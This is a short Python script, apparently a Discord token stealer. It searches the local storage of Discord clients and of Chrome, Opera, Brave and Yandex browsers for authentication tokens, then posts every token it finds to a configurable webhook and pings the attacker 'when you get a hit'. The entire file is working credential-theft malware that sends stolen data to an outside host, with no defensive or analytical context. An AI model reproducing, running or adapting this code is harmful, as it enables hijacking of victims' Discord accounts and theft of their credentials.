import os
import re
import json
from sys import platform
import requests
# your webhook URL
WEBHOOK_URL = ''

# mentions you when you get a hit
PING_ME = True

def send_message(message):
    headers = {
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
    }
    payload = json.dumps({'content': message})
    req = requests.post(WEBHOOK_URL, data=payload.encode(), headers=headers)

def find_tokens(path, platform):
    separator = "/"
    if platform == "linux" or platform == "linux2":
        separator = "/"
    elif platform == "win32":
        separator = "\\"
    path += separator+'Local Storage'+separator+'leveldb'

    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}{separator}{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main(platform):
    if platform == "linux" or platform == "linux2":
        configdir = "/home/amirmahdi/.config"
        paths = {
            'Discord': configdir + '/Discord',
            'Discord Canary': configdir + '/discordcanary',
            'Discord PTB': configdir + '/discordptb',
        }
    elif platform == "win32":
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')
        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

    message = '@everyone' if PING_ME else ''

    for app, path in paths.items():
        if not os.path.exists(path):
            continue
        message += f'\n**{app}**\n```\n'

        tokens = find_tokens(path, platform)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'

        message += '```'

    send_message(message)

if __name__ == "__main__":       
    main(platform)
